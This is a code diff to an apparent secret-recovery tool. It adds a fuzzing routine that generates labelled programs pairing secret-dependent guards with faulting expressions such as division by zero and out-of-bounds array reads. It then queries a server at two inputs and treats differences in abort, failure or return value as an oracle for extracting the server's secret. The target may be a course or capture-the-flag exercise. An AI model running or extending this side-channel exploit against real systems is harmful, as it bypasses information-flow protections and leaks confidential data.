@@ -744,6 +744,152 @@ def recover_from_strict_expr_abort_suite(
     raise StrategyFailed(last_error)
 
 
+def make_strict_expr_fuzz_program(
+    *,
+    guard: str,
+    op: str,
+    payload: str,
+    payload_first: bool,
+    needs_array: bool,
+) -> str:
+    lhs = payload if payload_first else guard
+    rhs = guard if payload_first else payload
+    array_decl = ""
+    if needs_array:
+        array_decl = """  //@label H;
+  int[] A = alloc_array(int, 1);
+"""
+    return f"""int main(int input, int secret) {{
+{array_decl}  //@label H;
+  bool witness = ({lhs}) {op} ({rhs});
+  return 0;
+}}
+"""
+
+
+def iter_strict_expr_fuzz_programs() -> list[tuple[str, str]]:
+    guards = [
+        ("s-lt-i", "(secret < input)"),
+        ("i-le-s", "(input <= secret)"),
+        ("s-eq-i", "(secret == input)"),
+        ("not-s-lt-i", "(!(secret < input))"),
+        ("i-eq-i", "(input == input)"),
+        ("i-lt-i", "(input < input)"),
+    ]
+    payloads = [
+        ("div0", "((1 / 0) == 0)", False),
+        ("mod0", "((1 % 0) == 0)", False),
+        ("oob-a1", "(A[1] == 0)", True),
+        ("oob-inp1", "(A[(input - input) + 1] == 0)", True),
+        ("bit-div2", "((1 / ((secret / 2) % 2)) == 1)", False),
+        ("bit-div4", "((1 / ((secret / 4) % 2)) == 1)", False),
+    ]
+    out: list[tuple[str, str]] = []
+    for guard_name, guard in guards:
+        for payload_name, payload, needs_array in payloads:
+            for op in ("&&", "||"):
+                for payload_first in (False, True):
+                    order_name = "payload-first" if payload_first else "guard-first"
+                    name = f"{guard_name}-{op}-{payload_name}-{order_name}"
+                    src = make_strict_expr_fuzz_program(
+                        guard=guard,
+                        op=op,
+                        payload=payload,
+                        payload_first=payload_first,
+                        needs_array=needs_array,
+                    )
+                    out.append((name, src))
+    return out
+
+
+def recover_from_strict_expr_fuzz_suite(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+    debug: bool,
+    max_probes: int = 96,
+) -> int:
+    programs = iter_strict_expr_fuzz_programs()
+    tested = 0
+    informative = 0
+    for name, source in programs:
+        if tested >= max_probes:
+            break
+        tested += 1
+        with ProgramFile(source) as path:
+            res_lo = run_query(
+                server_command=server_command,
+                userid=userid,
+                program_path=path,
+                input_value=SECRET_MIN,
+                timeout_s=timeout_s,
+            )
+            res_hi = run_query(
+                server_command=server_command,
+                userid=userid,
+                program_path=path,
+                input_value=SECRET_MAX_EXCLUSIVE,
+                timeout_s=timeout_s,
+            )
+        if res_lo.kind == "success" and res_lo.value is not None:
+            return res_lo.value
+        if res_hi.kind == "success" and res_hi.value is not None:
+            return res_hi.value
+
+        # Informative kind oracle candidate
+        if (
+            res_lo.kind in {"abort", "failure"}
+            and res_hi.kind in {"abort", "failure"}
+            and res_lo.kind != res_hi.kind
+        ):
+            informative += 1
+            debug_log(
+                debug,
+                f"[strict-fuzz] informative kind probe {name}: "
+                f"lo={res_lo.kind} hi={res_hi.kind}",
+            )
+            try:
+                return recover_from_kind_oracle(
+                    server_command=server_command,
+                    userid=userid,
+                    timeout_s=timeout_s,
+                    program_source=source,
+                    true_kinds={res_hi.kind},
+                    false_kinds={res_lo.kind},
+                )
+            except StrategyFailed:
+                pass
+
+        # Informative boolean-oracle candidate
+        if (
+            res_lo.kind == "failure"
+            and res_hi.kind == "failure"
+            and res_lo.value in {0, 1}
+            and res_hi.value in {0, 1}
+            and res_lo.value != res_hi.value
+        ):
+            informative += 1
+            debug_log(
+                debug,
+                f"[strict-fuzz] informative bool probe {name}: "
+                f"lo={res_lo.value} hi={res_hi.value}",
+            )
+            try:
+                return recover_from_failure_oracle(
+                    server_command=server_command,
+                    userid=userid,
+                    timeout_s=timeout_s,
+                    program_source=source,
+                )
+            except StrategyFailed:
+                pass
+
+    raise StrategyFailed(
+        f"strict expr-fuzz found no usable oracle (tested={tested}, informative={informative})"
+    )
+
+
 def median_runtime_for_input(
     *,
     server_command: str,
@@ -1298,6 +1444,16 @@ def recover_server_secret(
                 server_command=server_command,
                 userid=userid,
                 timeout_s=tuned_query_timeout,
+            ),
+        ),
+        (
+            "strict expr fuzz suite",
+            lambda: recover_from_strict_expr_fuzz_suite(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                debug=debug,
+                max_probes=96,
             ),
         ),
         (
